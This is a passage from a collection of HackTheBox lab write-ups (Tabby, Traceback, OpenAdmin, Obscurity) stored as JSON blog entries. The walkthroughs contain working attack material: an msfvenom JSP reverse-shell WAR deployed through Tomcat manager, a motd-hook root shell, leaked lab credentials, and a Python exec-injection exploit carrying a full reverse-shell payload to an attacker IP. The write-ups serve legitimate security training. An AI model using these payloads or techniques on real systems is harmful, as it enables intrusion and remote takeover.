/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.txt ... /index.html (Status: 200) /docs (Status: 302) /examples (Status: 302) /manager (Status: 302)   Among all the various directories, /manager immediately caught my attention: trying to logging in, the server reveals which file contains the credentials, allowing us to use the LFI to get them.    Finding tomcat-users.xml was a pain as the installation of the web server was done without following standards paths and rules, however, after a couple of hours I was able to read the file, located in /usr/share/tomcat9/etc/tomcat-users.xml      Good! Now we are able to login into the /manager directory and proceeds.  Since the tomcat user are assigned the roles of admin-gui and manager-script, he has the permission to access the host-manager webapp via web gui (from which nothing can be done) but also to interact via cli with the manager webapp, which allows us to upload .war files to the server (see the official documentation).  Once we find the way, let‚Äôs create our reverse shell through msfconsole  root@kali:/var/www/html#  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=9876 -f war &gt; maoutis.war Payload size: 1095 bytes Final size of war file: 1095 bytes  root@kali:/var/www/html# ls -al maoutis.war -rw-r--r-- 1 root root 1095 Jun 29 19:08 maoutis.war   load it on the server  root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' -T maoutis.war 'http://10.10.10.194:8080/manager/text/deploy?path=/maoutis' OK - Deployed application at context path [/maoutis] root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list OK - Listed applications for virtual host [localhost] /:running:0:ROOT /maoutis:running:0:maoutis /examples:running:0:/usr/share/tomcat9-examples/examples /host-manager:running:1:/usr/share/tomcat9-admin/host-manager /manager:running:0:/usr/share/tomcat9-admin/manager /docs:running:0:/usr/share/tomcat9-docs/docs and run it to get access as *tomcat* user.   root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/maoutis/   root@kali:~# nc -lvp 9876 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' tomcat@tabby:/var/lib/tomcat9$ export TERM=screen CTRL+Z root@kali:~/HackTheBox# stty raw -echo root@kali:~/HackTheBox# fg  tomcat@tabby:/var/lib/tomcat9$   Lateral Movement to ash  Once gained the shell, further enumeration reveals that the user of the box is ash.  Running LinEnum.sh we discovered a .zip backup file inside /var/www/html/files/ which require to be cracked in order to be unzipped. Let‚Äôs use fcrackzip in order to crack the archive.  root@kali:~/HackTheBox/Machine/Tabby/files# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' 16162020_backup.zip  PASSWORD FOUND!!!!: pw == admin@it   Password found! While inside the archive we didn‚Äôt find anything useful, trying to use the password to switch to ash reveals that the same password has been reused.  tomcat@tabby:/var/www/html/files$ su ash                                                                              Password: admin@it                                                                                                            ash@tabby:/var/www/html/files$ uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)   Well done! We are ash!  Privilege Escalation  Running again LinEnum.sh it reveals that we are members of the lxd group and that exists a way to abuse this permission in order to became root. Searching on Google I found this article, which describes how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD.  First, download the lxd-alpine-builder locally on the kali machine and built it as root $git clone https://github.com/saghul/lxd-alpine-builder.git $cd lxd-alpine-builder $sudo bash build-alpine  Probably will appear errors like ‚Äútar: Ignoring unknow ‚Ä¶ ‚Äú. Don‚Äôt worry and continue ¬†¬†¬†¬†with the privilege escalation process.  Then upload the .tar file on the ash home directory and import it inside lxc    Once finished, we will be root!  Trophy If you can't give me poetry, can't you give me poetical science?   - Ada Lovelace"
  },
  
  {
    "title": "HackTheBox - Traceback",
    "url": "/posts/traceback/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2020-03-14 00:00:00 +0100",
    "content": "Improved skills:     OSINT   Luvit lateral movement   motd privilege escalation   Used tools:     nmap   owasp zap   pspy64   netcat     Introduction &amp; Foothold  Like for every CTF we made, let‚Äôs start scanning the box with nmap  $ nmap 10.10.10.181 --top-ports 25 --open -sC -sV -oA nmap/openPorts.txt PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) |   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   As we can see, there are only two services exposed: SSH (port 22) and the Apache Web Server (port 80).  Visiting the site, we discover that the machine has been owned and there is a backdoor    Looking to the source code of the page, a comment comes out.    Searching it on google, it reveals to be the description of a repo containing only web-shells. We can suppose that one of those shells is the one used in this machine.  Assuming this, lets create a wordlist using the discovered shells‚Äô name and fuzz the web page in order to find the correct one.      Bingo! smevk.php is the web shell used on the box.    Credentials can be found on the source code on github. Easily guessable, the combination is admin:admin    Once inside, we can easily submit commands to the box. In order to get a more stable and comfortable shell, I added my SSH key to the authorized_keys file, obtaining an SSH access as webadmin.      Lateral Movement to sysadmin  Listing all the files within the webadmin home directory, we discovered the presence of Luvit, a     scripting platform just like node. This can be used to run lua scripts as standalone servers, clients, or other tools.   Furthermore, webadmin has the permissions to run luvit as sysadmin using sudo. It becames easy to perform action as sysadmin, like reading files   or getting a shell:    Privilege Escalation  Analyzing the processes running on the machine I noticed the presence of a process owned by the root modifiable by sysadmin.  2020/03/15 15:45:01 CMD: UID=106  PID=28288  | sshd: [net]           2020/03/15 15:45:01 CMD: UID=0    PID=28290  | run-parts --lsbsysinit /etc/update-motd.d 2020/03/15 15:45:01 CMD: UID=0    PID=28289  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2020/03/15 15:45:01 CMD: UID=0    PID=28297  | cut -c -80 2020/03/15 15:45:01 CMD: UID=0    PID=28296  | 2020/03/15 15:45:01 CMD: UID=0    PID=28295  | 2020/03/15 15:45:01 CMD: UID=0    PID=28293  | /bin/sh /etc/update-motd.d/50-motd-news 2020/03/15 15:45:01 CMD: UID=0    PID=28298  | run-parts --lsbsysinit /etc/update-motd.d 2020/03/15 15:45:01 CMD: UID=0    PID=28299  | /usr/bin/python3 -Es /usr/bin/lsb_release -cs 2020/03/15 15:45:01 CMD: UID=0    PID=28301  | /usr/sbin/CRON -f 2020/03/15 15:45:01 CMD: UID=0    PID=28300  | /usr/sbin/CRON -f 2020/03/15 15:45:01 CMD: UID=0    PID=28305  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ 2020/03/15 15:45:01 CMD: UID=0    PID=28304  | sleep 30 2020/03/15 15:45:01 CMD: UID=0    PID=28303  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/03/15 15:45:01 CMD: UID=0    PID=28302  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/03/15 15:45:01 CMD: UID=0    PID=28306  | /usr/bin/python3 -Es /usr/bin/lsb_release -ds 2020/03/15 15:45:01 CMD: UID=0    PID=28307  | /bin/sh /etc/update-motd.d/91-release-upgrade 2020/03/15 15:45:01 CMD: UID=0    PID=28310  | cut -d  -f4 2020/03/15 15:45:01 CMD: UID=0    PID=28309  | /usr/bin/python3 -Es /usr/bin/lsb_release -sd 2020/03/15 15:45:01 CMD: UID=0    PID=28308  | /bin/sh /etc/update-motd.d/91-release-upgrade 2020/03/15 15:45:02 CMD: UID=0    PID=28315  | sshd: sysadmin [priv] 2020/03/15 15:45:02 CMD: UID=1001 PID=28316  | -sh   /etc/update-motd.d/50-motd-news is called every time a user logs into the box, with root privileges. However, this file can be edited from non-root users. Abusing this issue, let‚Äôs use the reverse shell script used before in order to obtain a reverse shell as root at the next login.  sysadmin@traceback:~$ nano /etc/update-mot.d/50-motd-news  #!/bin/bash /bin/bash /tmp/revShell.sh ...     Trophy Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.   - Chanda Kochhar"
  },
  
  {
    "title": "HackTheBox - OpenAdmin",
    "url": "/posts/openadmin/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2020-01-04 00:00:00 +0100",
    "content": "Improved skills:     Enumeration   Apache configuration review   Code review   Lateral movement   Port Forwarding   SSH keys cracking   nano privilege escalation (GTFO)   Used tools:     nmap   dirbuster   searchsploit   metasploit   pspy64   SwitchyOmega   ssh2john   john     Introduction &amp; Foothold  Let‚Äôs start as every time with an nmap scan:  root@kali:~/Documents/CTF/Machine/OpenAdmin# nmap -sV -A -O  10.10.10.171 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-11 11:28 CET Nmap scan report for 10.10.10.171 Host is up (0.060s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) |   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=2/11%OT=22%CT=1%CU=31767%PV=Y%DS=2%DC=T%G=Y%TM=5E4281D OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2= OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)  Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 1720/tcp) HOP RTT      ADDRESS 1   61.58 ms 10.10.14.1 2   61.83 ms 10.10.10.171  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.18 seconds   We can see that only two services are exposed: a non-vulnerable SSH version, and an Apache web server on port 80 with a default page.  In order to enumerate all the possible sub-pages of the site and find an entry point, let‚Äôs start a Dirbuster scan. Among the first results of the tool execution we find these records:  / /index.php /icons/ /music/ /ona/  Visiting each page, arrived at http://10.10.10.171/ona/ we realize that in front of us we have a vulnerable version of OpenNetAdmin, a web application for the network administration. Let‚Äôs use searchsploit to find out if there are exploits fitting this particular version‚Ä¶ the 47772 seems to be what we need, a Command Injection on OpenNetAdmin 18.1.1. We just have to download it, import it into metasploit, set the correct parameters and run it.  Lateral movement to Jimmy  Analyzing the contents of the /etc/passwd file we notice that the main users on the box are actually two: Jimmy and Joanna.  After having take a look at the machine and launching LinEnum.sh without success, I decided to check better the processes of the machine via pspy64.    By observing the various processes, one particular line attracts my attention:  2020/02/14 22:35:20 CMD: UID=33 PID=7150 | sh -c php -l /opt/ona/www/local/config/database_settings.inc.php   I decide to analyze the contents of the database_settings.inc.php file:  &lt;?php  $ona_contexts=array (   'DEFAULT' =&gt;   array (     'databases' =&gt;     array (       0 =&gt;       array (         'db_type' =&gt; 'mysqli',         'db_host' =&gt; 'localhost',         'db_login' =&gt; 'ona_sys',         'db_passwd' =&gt; 'n1nj4W4rri0R!',         'db_database' =&gt; 'ona_default',         'db_debug' =&gt; false,       ),     ),     'description' =&gt; 'Default data context',     'context_color' =&gt; '#D3DBFF',   ), );   We have a password! Let‚Äôs try using it to log in as jimmy‚Ä¶ it works!  Lateral movement to Joanna  Now that we have a shell as jimmy, our goal is to become joanna, as this user will take us to the root.  Since we have new privileges compared to before, we will be able to enumerate the machine in more depth, as for the /var/www/internal/folder, which seems to suggest the presence of a web page that can only be visited from inside the machine, so before we could not find it via dirbuster.    The confirmation is obtained from the Apache configuration file, which tells us that on port 52846 there is a virtual host running as joanna, exposing the pages contained in /var/www/internal/.    At this point, there are different ways to go over the obstacle:     SSH Port Forwarding   local curl   Write a PHP shell in the /var/www/internal/ directory      In this writeup we will deal with the port forwarding approach.   I used the OpenAdmin box as an SSH tunnel on the Kali local port 12345, and through SwitchyOmega I used port 12345 as a proxy so that when I visited http://127.0.0.1/52864 I was actually visiting locally the OpenAdmin machine.    In this way we can interact with the web application as if it was an exposed application.  Having access to the /var/www/internal/folder, it was possible to review the sources contents in search of any vulnerabilities or bypass techniques. The index.php page, for example, to log in a user, checks the supplied input with a hard-coded hash:  &lt;?php   $msg = '';    if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {     if ($_POST['username'] == 'jimmy' &amp;&amp; hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {         $_SESSION['username'] = 'jimmy';         header(\"Location: /main.php\");     } else {         $msg = 'Wrong username or password.';     }   } ?&gt;   It is therefore easy to bypass the control, either by deciding to crack the hash (which turns out to be a SHA512 containing the password Revealed), or, since we have access to the source in read/write, replacing the control with a control at will.  Once the control is bypassed, we will find ourselves on the main.php page with Joanna‚Äôs private RSA certificate shown on the video.    Let‚Äôs copy it into the joanna.txt file and give it to ss2john in order to generate a hash that can be cracked with john:    We have Joanna‚Äôs password!  Privilege Escalation  The Privilege Escalation process is the easiest and fastest I‚Äôve ever seen. By running the sudo -l command we notice how the user joanna can open the /opt/priv file via the nano text editor as root user.    We just have to run the command and, within nano, use the code execution feature to be able to run commands as root!    Trophy It's never too late to start.&lt;br&gt; - Me, Myself and I"
  },
  
  {
    "title": "HackTheBox - Obscurity",
    "url": "/posts/obscurity/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2019-11-30 00:00:00 +0100",
    "content": "Improved skills:     Code review   Reversing   Python coding   Cracking shadow file   Used tools:     nmap   owasp zap   python   john     Introduction &amp; Foothold  Obscurity is a medium difficulty Linux machine, containing completely custom components, which respects the proverb ‚ÄúSecurity through Obscurity‚Äù.  Let‚Äôs start as always with a nmap port scan:  $ nmap -A -O --script=banner -o nmap.txt 10.10.10.168 # Nmap 7.80 scan initiated Fri Feb 21 22:01:19 2020 as: nmap -A -O --script=banner -o nmap.txt 10.10.10.168 Nmap scan report for 10.10.10.168 Host is up (0.048s latency). Not shown: 996 filtered ports PORT     STATE  SERVICE    VERSION 22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 8080/tcp open   http-proxy BadHTTPServer | fingerprint-strings: |   GetRequest, HTTPOptions: |     HTTP/1.1 200 OK |     Date: Fri, 21 Feb 2020 21:03:21 |     Server: BadHTTPServer |     Last-Modified: Fri, 21 Feb 2020 21:03:21 |     Content-Length: 4171 |     Content-Type: text/html |     Connection: Closed |     &lt;!DOCTYPE html&gt; |     &lt;html lang=\"en\"&gt; |     &lt;head&gt; |     &lt;meta charset=\"utf-8\"&gt; |     &lt;title&gt;0bscura&lt;/title&gt; |     &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"&gt; |     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; |     &lt;meta name=\"keywords\" content=\"\"&gt; |     &lt;meta name=\"description\" content=\"\"&gt; |     &lt;!-- |     Easy Profile Template |     http://www.templatemo.com/tm-467-easy-profile |     &lt;!-- stylesheet css --&gt; |     &lt;link rel=\"stylesheet\" href=\"css/bootstrap.min.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"css/font-awesome.min.css\"&gt; |     &lt;link rel=\"stylesheet\" href=\"css/templatemo-blue.css\"&gt; |     &lt;/head&gt; |     &lt;body data-spy=\"scroll\" data-target=\".navbar-collapse\"&gt; |     &lt;!-- preloader section --&gt; |     &lt;!-- |     &lt;div class=\"preloader\"&gt; |_    &lt;div class=\"sk-spinner sk-spinner-wordpress\"&gt; |_http-server-header: BadHTTPServer 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.80%I=7%D=2/21%Time=5E50452A%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,10FC,\"HTTP/1\\.1\\x20200\\x20OK\\nDate:\\x20Fri,\\x2021\\x20Feb\\x2020 SF:20\\x2021:03:21\\nServer:\\x20BadHTTPServer\\nLast-Modified:\\x20Fri,\\x2021\\ SF:x20Feb\\x202020\\x2021:03:21\\nContent-Length:\\x204171\\nContent-Type:\\x20t SF:ext/html\\nConnection:\\x20Closed\\n\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\" SF:en\\\"&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\t&lt;title&gt;0bscura&lt;/title&gt;\\ SF:n\\t&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20content=\\\"IE=Edge\\\"&gt;\\n\\t&lt; SF:meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-s SF:cale=1\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"keywords\\\"\\x20content=\\\"\\\"&gt;\\n\\t&lt;meta\\x20na SF:me=\\\"description\\\"\\x20content=\\\"\\\"&gt;\\n&lt;!--\\x20\\nEasy\\x20Profile\\x20Templ SF:ate\\nhttp://www\\.templatemo\\.com/tm-467-easy-profile\\n--&gt;\\n\\t&lt;!--\\x20st SF:ylesheet\\x20css\\x20--&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/boo SF:tstrap\\.min\\.css\\\"&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/font-a SF:wesome\\.min\\.css\\\"&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/templa SF:temo-blue\\.css\\\"&gt;\\n&lt;/head&gt;\\n&lt;body\\x20data-spy=\\\"scroll\\\"\\x20data-target SF:=\\\"\\.navbar-collapse\\\"&gt;\\n\\n&lt;!--\\x20preloader\\x20section\\x20--&gt;\\n&lt;!--\\n&lt; SF:div\\x20class=\\\"preloader\\\"&gt;\\n\\t&lt;div\\x20class=\\\"sk-spinner\\x20sk-spinner SF:-wordpress\\\"&gt;\\n\")%r(HTTPOptions,10FC,\"HTTP/1\\.1\\x20200\\x20OK\\nDate:\\x20 SF:Fri,\\x2021\\x20Feb\\x202020\\x2021:03:21\\nServer:\\x20BadHTTPServer\\nLast-M SF:odified:\\x20Fri,\\x2021\\x20Feb\\x202020\\x2021:03:21\\nContent-Length:\\x204 SF:171\\nContent-Type:\\x20text/html\\nConnection:\\x20Closed\\n\\n&lt;!DOCTYPE\\x20 SF:html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\t SF:&lt;title&gt;0bscura&lt;/title&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20co SF:ntent=\\\"IE=Edge\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=dev SF:ice-width,\\x20initial-scale=1\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"keywords\\\"\\x20conte SF:nt=\\\"\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"description\\\"\\x20content=\\\"\\\"&gt;\\n&lt;!--\\x20\\nE SF:asy\\x20Profile\\x20Template\\nhttp://www\\.templatemo\\.com/tm-467-easy-pro SF:file\\n--&gt;\\n\\t&lt;!--\\x20stylesheet\\x20css\\x20--&gt;\\n\\t&lt;link\\x20rel=\\\"stylesh SF:eet\\\"\\x20href=\\\"css/bootstrap\\.min\\.css\\\"&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet SF:\\\"\\x20href=\\\"css/font-awesome\\.min\\.css\\\"&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet SF:\\\"\\x20href=\\\"css/templatemo-blue\\.css\\\"&gt;\\n&lt;/head&gt;\\n&lt;body\\x20data-spy=\\\" SF:scroll\\\"\\x20data-target=\\\"\\.navbar-collapse\\\"&gt;\\n\\n&lt;!--\\x20preloader\\x20 SF:section\\x20--&gt;\\n&lt;!--\\n&lt;div\\x20class=\\\"preloader\\\"&gt;\\n\\t&lt;div\\x20class=\\\"s SF:k-spinner\\x20sk-spinner-wordpress\\\"&gt;\\n--&gt;\"); Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Crestron XPanel control system (91%), Adtran 424RG FTTH gateway (90%), Linux 2.6.32 (90%), Linux 3.1 - 3.2 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 80/tcp) HOP RTT      ADDRESS 1   47.56 ms 10.10.14.1 2   47.70 ms 10.10.10.168  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 21 22:01:52 2020 -- 1 IP address (1 host up) scanned in 33.43 seconds   We find port 22 open, with OpenSSH 7.6p1, and port 8080, with BadHTTPServer, a completely custom web server. Visiting the content of the web server we find a series of static pages, apparently useless, but one of which containing a message for the developers:    We know that there is a developement folder containing the SuperSecureServer.py file‚Ä¶ let‚Äôs find it! We can use any fuzzing program, such as wfuzz, ffuf, zaproxy etc ‚Ä¶    We find that the correct URL is http://10.10.10.168:8080/develop/SuperSecureServer.py and the content of the file is the following:  import socket import threading from datetime import datetime import sys import os import mimetypes import urllib.parse import subprocess  respTemplate = \"\"\"HTTP/1.1 {statusNum} {statusCode} Date: {dateSent} Server: {server} Last-Modified: {modified} Content-Length: {length} Content-Type: {contentType} Connection: {connectionType}  {body} \"\"\" DOC_ROOT = \"DocRoot\"  CODES = {\"200\": \"OK\",         \"304\": \"NOT MODIFIED\",         \"400\": \"BAD REQUEST\", \"401\": \"UNAUTHORIZED\", \"403\": \"FORBIDDEN\", \"404\": \"NOT FOUND\",         \"500\": \"INTERNAL SERVER ERROR\"}  MIMES = {\"txt\": \"text/plain\", \"css\":\"text/css\", \"html\":\"text/html\", \"png\": \"image/png\", \"jpg\":\"image/jpg\",         \"ttf\":\"application/octet-stream\",\"otf\":\"application/octet-stream\", \"woff\":\"font/woff\", \"woff2\": \"font/woff2\",         \"js\":\"application/javascript\",\"gz\":\"application/zip\", \"py\":\"text/plain\", \"map\": \"application/octet-stream\"}   class Response:     def __init__(self, **kwargs):         self.__dict__.update(kwargs)         now = datetime.now()         self.dateSent = self.modified = now.strftime(\"%a, %d %b %Y %H:%M:%S\")     def stringResponse(self):         return respTemplate.format(**self.__dict__)  class Request:     def __init__(self, request):         self.good = True         try:             request = self.parseRequest(request)             self.method = request[\"method\"]             self.doc = request[\"documentc\"]             self.vers = request[\"vers\"]             self.header = request[\"header\"]             self.body = request[\"body\"]         except:             self.good = False      def parseRequest(self, request):                req = request.strip(\"\\r\").split(\"\\n\")         method,doc,vers = req[0].split(\" \")         header = req[1:-3]         body = req[-1]         headerDict = {}         for param in header:             pos = param.find(\": \")             key, val = param[:pos], param[pos+2:]             headerDict.update({key: val})         return {\"method\": method, \"doc\": doc, \"vers\": vers, \"header\": headerDict, \"body\": body}   class Server:     def __init__(self, host, port):            self.host = host         self.port = port         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)         self.sock.bind((self.host, self.port))      def listen(self):         self.sock.listen(5)         while True:             client, address = self.sock.accept()             client.settimeout(60)             threading.Thread(target = self.listenToClient,args = (client,address)).start()      def listenToClient(self, client, address):         size = 1024         while True:             try:                 data = client.recv(size)                 if data:                     # Set the response to echo back the recieved data                     req = Request(data.decode())                     self.handleRequest(req, client, address)                     client.shutdown()                     client.close()                 else:                     raise error('Client disconnected')             except:                 client.close()                 return False      def handleRequest(self, request, conn, address):         if request.good: #            try:                 # print(str(request.method) + \" \" + str(request.doc), end=' ')                 # print(\"from {0}\".format(address[0])) #            except Exception as e: #                print(e)             document = self.serveDoc(request.doc, DOC_ROOT)             statusNum=document[\"status\"]         else:             document = self.serveDoc(\"/errors/400.html\", DOC_ROOT)             statusNum=\"400\"         body = document[\"body\"]          statusCode=CODES[statusNum]         dateSent = \"\"         server = \"BadHTTPServer\"         modified = \"\"         length = len(body)         contentType = document[\"mime\"] # Try and identify MIME type from string         connectionType = \"Closed\"           resp = Response(         statusNum=statusNum, statusCode=statusCode,         dateSent = dateSent, server = server,         modified = modified, length = length,         contentType = contentType, connectionType = connectionType,         body = body         )          data = resp.stringResponse()         if not data:             return -1         conn.send(data.encode())         return 0      def serveDoc(self, path, docRoot):         path = urllib.parse.unquote(path)         try:             info = \"output = 'Document: {}'\" # Keep the output for later debug             exec(info.format(path)) # This is how you do string formatting, right?             cwd = os.path.dirname(os.path.realpath(__file__))             docRoot = os.path.join(cwd, docRoot)             if path == \"/\":                 path = \"/index.html\"             requested = os.path.join(docRoot, path[1:])             if os.path.isfile(requested):                 mime = mimetypes.guess_type(requested)                 mime = (mime if mime[0] != None else \"text/html\")                 mime = MIMES[requested.split(\".\")[-1]]                 try:                     with open(requested, \"r\") as f:                         data = f.read()                 except:                     with open(requested, \"rb\") as f:                         data = f.read()                 status = \"200\"             else:                 errorPage = os.path.join(docRoot, \"errors\", \"404.html\")                 mime = \"text/html\"                 with open(errorPage, \"r\") as f:                     data = f.read().format(path)                 status = \"404\"         except Exception as e:             print(e)             errorPage = os.path.join(docRoot, \"errors\", \"500.html\")             mime = \"text/html\"             with open(errorPage, \"r\") as f:                 data = f.read()             status = \"500\"         return {\"body\": data, \"mime\": mime, \"status\": status}   The script handles client-server requests to the web server, but contains a vulnerability in the following code segment  path = urllib.parse.unquote(path) try:             info = \"output = 'Document: {}'\" # Keep the output for later debug             exec(info.format(path)) # This is how you do string formatting, right?             cwd = os.path.dirname(os.path.realpath(__file__))             docRoot = os.path.join(cwd, docRoot)   since an exec instruction is executed into info, that contains path, a variable that we can populate at will and which will be injected into the exec.  Let‚Äôs build a script that allows us to exploit the vulnerability:  import requests import urllib import os  target = 'http://10.10.10.168:8080/'  expl = 'tmp\\''+'\\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.27\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"])\\na=\\''  payload = urllib.parse.quote(expl) print(\"payload\") print(target + payload)  r = requests.get(target+payload)  print(r.headers) print(t.text)   This script will inject a reverse-shell to our IP, on port 9999, as the content of the variable passed to the exec statement will compose this payload:  exec (output = 'Document: tmp' import socket, subprocess, os; s = socket.socket (socket.AF_INET, socket.SOCK_STREAM); s.connect ((\"10.10.14.27\", 9999)); os.dup2 (s.fileno (), 0); os.dup2 (s.fileno (), 1); os.dup2 (s.fileno (), 2); p = subprocess.call ([ \"/ bin / bash\", \"- i\"]) a = '')      Lateral movement to Robert  Once we got the shell as www-data, let‚Äôs do some post-exploitation recon to find out that the user of the machine is called Robert. Visiting his home directory we find out that we can read the contents of his files.    Inside the home we find a series of scripts, including a custom SSH server (BetterSSH), a crypt-decrypt tool (SuperSecureCrypt.py) and a set of files to perform some tests.  The code for SuperSecureCrypt.py is the following:  import sys import argparse  def encrypt(text, key):     keylen = len(key)     keyPos = 0     encrypted = \"\"     for x in text:         keyChr = key[keyPos]         newChr = ord(x)         newChr = chr((newChr + ord(keyChr)) % 255)         encrypted += newChr         keyPos += 1         keyPos = keyPos % keylen     return encrypted  def decrypt(text, key):     keylen = len(key)     